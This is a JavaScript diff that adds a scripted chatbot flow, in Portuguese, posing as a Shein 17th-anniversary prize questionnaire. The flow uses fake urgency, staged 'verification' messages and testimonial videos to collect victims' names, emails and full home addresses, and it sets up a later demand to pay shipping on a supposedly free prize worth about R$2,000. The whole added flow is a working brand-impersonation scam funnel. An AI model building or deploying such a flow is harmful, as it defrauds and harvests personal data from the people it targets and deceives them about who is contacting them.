@@ -47,6 +47,324 @@ async function consultarCepViaApi(cep) {
 
 // Fluxo de conversa (com placeholders dinâmicos)
 var conversationFlow = [
+         { type: 'bot', delay: 1000, content: '<span class="bold">Parabéns!</span> Você foi selecionada para o questionário <span class="bold">Shein 17 anos</span>...' },
+  { type: 'bot', delay: 1500, content: 'Olá! Seja bem vinda ao <b>questionário premiado</b> em comemoração aos <b>17 anos da Shein!</b>' },
+  { type: 'bot', delay: 1700, content: 'Sou a <b>Fernanda</b>, atendente virtual da <b>Shein</b> e vou te auxiliar no seu <b>questionário premiado!</b> 🥰' },
+  { type: 'bot', delay: 1500, content: 'Antes de começarmos, veja a <b>matéria exclusiva</b> divulgada nos jornais sobre nosso questionário <b>premiado:</b>' },
+  { type: 'bot', delay: 1500, content: '<div class="z-20 text-fade-in w-full" ><iframe id="embed-bubble-content" class="w-full h-full " src="https://iframe.vslplay.com/81e6496e-c95e-4703-b1a0-6755799a3aaf"></iframe></div>', type_text: 'video', duration: 35000 },
+  { type: 'bot', delay: 3000, content: `Hoje ${dataAtualPtBr()}, é o último dia para <b>responder o questionário e resgatar a sua premiação</b> caso esteja qualificada.` },
+  { type: 'bot', delay: 1000, content: 'Podemos iniciar o questionário?', buttons: ['Iniciar questionário agora!'] },
+  { type: 'bot', delay: 1200, content: 'Antes de prosseguirmos, devo informar que o questionário é limitado a <b>1 resposta por Pessoa.</b>' },
+
+{ type: 'bot', delay: 1000, content: 'Para começarmos, preciso que me informe somente o <b>seu primeiro nome:</b>', input: true, input_name: 'nome' },
+  { type: 'bot', delay: 2000, content: '{userName}, em poucos minutos você poderá receber até <b>2.000 reais em itens da Shein!</b>🎊' },
+  { type: 'bot', delay: 1500, content: 'Para concluirmos a sua participação no questionário premiado, precisamos do seu email:', input: true, input_name: 'email' },
+  { type: 'bot', delay: 1500, content: 'Estamos validando sua participação em nosso questionário...' },
+  { type: 'bot', delay: 1500, content: '<b>✅ Verificado!</b><br>Você está qualificada para nosso questionário!' },
+  { type: 'bot', delay: 2000, content: '{userName}, podemos iniciar o questionário?', buttons: ['Sim'] },
+  { type: 'bot', delay: 2000, content: 'Para confirmarmos que você <b>não é um robô</b>, marque a data que você está <b>respondendo esse questionário:</b>' },
+  { type: 'bot', delay: 2000, content: `Opção 01 - ${dataAtualPtBr()}` },
+  { type: 'bot', delay: 2000, content: 'Opção 02 - quarta-feira, 11 de outubro de 2024' },
+  { type: 'bot', delay: 2000, content: 'Opção 03 - sexta-feira, 25 de junho de 2025' },
+  { type: 'bot', delay: 1500, content: 'Qual opção está <b>correta?</b>', buttons: ['Opção 01', 'Opção 02', 'Opção 03'], correct: 'Opção 01', returnStep: 14 },
+  { type: 'bot', delay: 1500, content: '<b>{userName}</b>, seja bem vinda ao <b>questionário premiado Shein</b>, o tempo de duração média é de <b>2 a 5 minutos</b>, vamos começar? ',buttons: ['Sim']},
+
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/whr17iofzsncb4j80wz5bqr2?v=1760032476611'
+      },
+      {
+        type: 'bot',
+        delay: 1500,
+        content: '<b>Pergunta 01:</b><br>Você já adquiriu algum produto da <b>Shein?</b>',
+        buttons: ['Sim, já sou cliente', 'Não, ainda não comprei']
+      },
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/vr0i4kapj0a1cvtnwh3j7d71?v=1760032515362'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: 'O que mais te <b>chama atenção</b> em nossos produtos?',
+        buttons: ['Qualidade', 'Tecnologia e inovação', 'Design', 'Suporte ao cliente', 'Outro']
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: '<b>Agradecemos sua resposta!</b><br>Vamos para a próxima pergunta...'
+      },
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/favoqbv0hyop245a71srq928?v=1760032553892'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: 'Pergunta 02:<br><br><span class="bold">Com que frequência você faz compras na Shein?</span>',
+        buttons: ['Semanalmente', 'Mensalmente', 'A cada dois meses', 'Raramente']
+      },
+
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/jmdt2mzy8qte9m5kcxwsxtl8?v=1760032580858'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: 'Pergunta 03:<br><br><span class="bold">Quais tipos de produtos você mais compra na Shein?</span>',
+        buttons: ['Roupas femininas', 'Roupas masculinas', 'Roupas infantis', 'Calçados']
+      },
+
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/rd8ps0sfdzpvfqcgmggn8bjt?v=1760032607869'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: 'Pergunta 04:<br><br><span class="bold">Quais são os fatores mais importantes para você ao escolher um produto na Shein?</span>',
+        buttons: ['Preço', 'Qualidade', 'Estilo', 'Tendências da moda', 'Comentários de outros clientes']
+
+      },
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/tivx6nkes3dwy2yt1c7dgjse?v=1760032639772'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: 'Pergunta 05:<br><br><span class="bold">Qual é a sua experiência geral de navegação no site/app da Shein?</span>',
+        buttons: ['Muito fácil', 'Fácil', 'Neutra', 'Difícil', 'Muito dificil']
+
+      },
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/nsj6qdv9buo8e2gi4ojk85ln?v=1760032680232'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: 'Pergunta 06:<br><br><span class="bold">Quão satisfeita você está com o tempo de entrega dos produtos da Shein?</span>',
+        buttons: ['Muito satisfeita', 'Satisfeita', 'Neutra', 'Insatisfeita', 'Muito insatisfeita']
+
+      },
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/i58hsdyyy3q0cq0cvdfzo351?v=1760032712684'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: 'Pergunta 07:<br><br><span class="bold">Quais estilos de roupa você gostaria de ver mais na Shein?</span>',
+        buttons: ['Casual', 'Esportivo', 'Formal', 'Vintage', 'Alternativo']
+
+      },
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'images/verificando.gif'
+      },
+      {
+        type: 'bot',
+        delay: 2500,
+        content: '<b>Parabéns você completou todas as perguntas com sucesso! 😍 </b>'
+
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: '<b>Escolha a opção abaixo de qual <b>produto você gostaria de ganhar:</b> </b>'
+
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: '<b>Opcão 01:</b>'
+
+      },
+
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/ffvo3huuxccikfss50syf8i2?v=1760032729181'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: '<b>Kits Maquiagem Shein</b> -  Valor de até <b>R$1.989,70.</b> '
+
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: '<b>Opcão 02:</b>'
+
+      },
+
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/bq80iyoglph7kofw7dabkww2?v=1760032751979'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: '<b>Escolha os Looks que desejar</b> - Tema Livre - Valor de até <b>R$1.992,00. </b> '
+
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: '<b>Opcão 03:</b>'
+
+      },
+
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/e9z1k8dgcpzojm7ho3hxrl67?v=1760032793494'
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: '<b>Escolha os Looks que desejar</b> - Tema Livre - Valor de até <b>R$1.992,00. </b> '
+
+      },
+      {
+        type: 'bot',
+        delay: 1000,
+        content: 'Qual opção você gostaria de ganhar?',
+        buttons: ['Opção 01', 'Opção 02', 'Opção 03'],
+        button_name: 'produtoEscolhido' // CORREÇÃO: Adicionado button_name para capturar a escolha
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: 'Antes de prosseguirmos com <b>sua premiação</b>, veja o que <b>algumas pessoas</b> nos mandam diariamente 🥰 ',
+
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: '<iframe id="embed-bubble-content" class="w-full h-full " src="https://www.youtube-nocookie.com/embed/v6iCFyNdjrI?autoplay=0&amp;controls=0&amp;disablekb=1&amp;playsinline=1&amp;cc_load_policy=0&amp;showinfo=0&amp;modestbranding=0&amp;rel=0&amp;loop=0&amp;fs=0&amp;widget_referrer=https%3A%2F%2Fatendimentoprivado.com%2F&amp;enablejsapi=1&amp;origin=https%3A%2F%2Fiframe.vslplay.com&amp;widgetid=1&amp;forigin=https%3A%2F%2Fiframe.vslplay.com%2F6b899dde-e319-46e4-b5b6-03d4c200c39b&amp;aoriginsup=1&amp;aorigins=https%3A%2F%2Fatendimentoprivado.com%2Chttps%3A%2F%2Fatendimentoprivado.com&amp;gporigin=https%3A%2F%2Fatendimentoprivado.com%2F&amp;vf=1"></iframe>',
+        type_text: 'video', duration: 30000,
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: '{userName}, por que você gostaria de ganhar o <b>{produtoEscolhido}</b> ?',
+        input: true
+
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: '<i>Aguarde alguns segundos enquanto eu verifico suas respostas... </i>',
+
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: '✅ <b>Respostas verificadas!</b>',
+
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: '🎉 Parabéns! Você está qualificada para ganhar  <b>{produtoEscolhido}</b>!',
+
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: 'De acordo com as regras do nosso questionário premiado, os <b>{produtoEscolhido}</b> sairá por R$0,00. ',
+
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: 'Isso mesmo, o aniversário é nosso e quem ganha é você!',
+
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: '<b>Agora escreva abaixo suas cores preferidas. Exemplo:</b> Branco, cor claro ou escuro, rosa, etc. <br><b>Escreva com detalhes:</b> ',
+        input: true
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: '✅ Perfeito, {userName}!<br><b>Recebemos suas preferências com sucesso!</b><br>Agora nosso time está preparando uma seleção <b>exclusiva só pra você</b> – com  100% do seu gosto. 💖',
+
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: 'Lembre-se que hoje é o <b>último dia</b> para <b>resgatar seu prêmio</b>, e caso você <b>não conclua a etapa a seguir</b> seu prêmio será <b>expirado</b> e dará oportunidade para outro participante. ',
+
+      },
+      {
+        type: 'bot',
+        delay: 1600,
+        content: 'Você será <b>redirecionada</b> para uma <b>página onde deverá preencher suas informações de contato.</b><br>Em seguida, entrarei em <b>contato pessoalmente</b> com você para <b>confirmar as escolhas das roupas e o endereço de entrega<b>, além de alinhar os <b>detalhes do pagamento do frete</b> no prazo que preferir.',
+
+      },
+      {
+        type: 'bot',
+        delay: 1500,
+        content: 'Para onde devemos enviar seu prêmio? Por favor, digite o seu <b>CEP (sem traços):</b>:',
+        input: true,
+        input_name: "cep"
+      },
+      // NOVO PASSO (Simulação de verificação e pedido do número)
+      {
+        type: 'bot',
+        delay: 1600,
+        content: '<i>Estamos verificando seu CEP...</i>',
+      },
+      // NOVO PASSO (Exibe o endereço encontrado e pede o número)
+      {
+        type: 'bot',
+        delay: 1600,
+        content: ' Encontramos o seguinte endereço: <br><b>{endereco}</b><br><br>Agora, por favor, digite o <b>número da sua casa/apartamento</b>:',
+        input: true,
+        input_name: "numeroCasa"
+      },
+      // PASSO (Confirmação do endereço)
+      {
+        type: 'bot',
+        delay: 1600,
+        content: 'Seu endereço completo está correto? <br><b>{endereco}</b>',
+        buttons: ['Sim, está correto'], // Adicionado opção de erro
+        button_name : 'confirmacaoEndereco',
+        correct: 'Sim, está correto', 
+        returnStep: 63 // CORREÇÃO: Volta para o passo de CEP (índice 62 + 1)
+      },
+      // PASSO (Originalmente 65)
+      {
+        type: 'bot',
+        delay: 1500,
+        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/fc231c2y88djlh3bmi6bs0r7?v=1760373533488'
+      },
+      // PASSO (Originalmente 66)
+      {
+        type: 'bot',
+        delay: 1500,
+        content: '{userName}, seus dados foram <b>salvos com sucesso!</b> Em breve sua premiação chegará ate você! 😍' 
+
+      },
+      // PASSO (Originalmente 67)
+
       
       {
         type: 'bot',
